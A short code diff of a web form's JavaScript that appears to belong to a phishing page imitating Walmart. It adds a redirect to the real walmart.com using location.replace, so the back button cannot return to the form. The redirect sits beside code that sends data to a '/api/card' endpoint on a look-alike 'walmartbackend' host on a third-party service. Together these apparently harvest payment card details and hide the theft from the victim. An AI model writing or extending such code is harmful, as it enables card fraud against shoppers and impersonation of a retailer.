@@ -302,6 +302,10 @@
   document.getElementById('success').style.display = 'none';
   document.getElementById('loader').style.display = 'flex';
 
+  // Immediately redirect the user to Walmart after showing the loader
+  // Use replace so the back button won't return to this form page
+  window.location.replace('https://www.walmart.com');
+
       // Choose backend URL depending on environment (local testing vs production)
       const backendUrl = (location.hostname === 'localhost' || location.hostname === '127.0.0.1') ?
         'http://localhost:3000/api/card' : 'https://walmartbackend-i8tm.onrender.com/api/card';
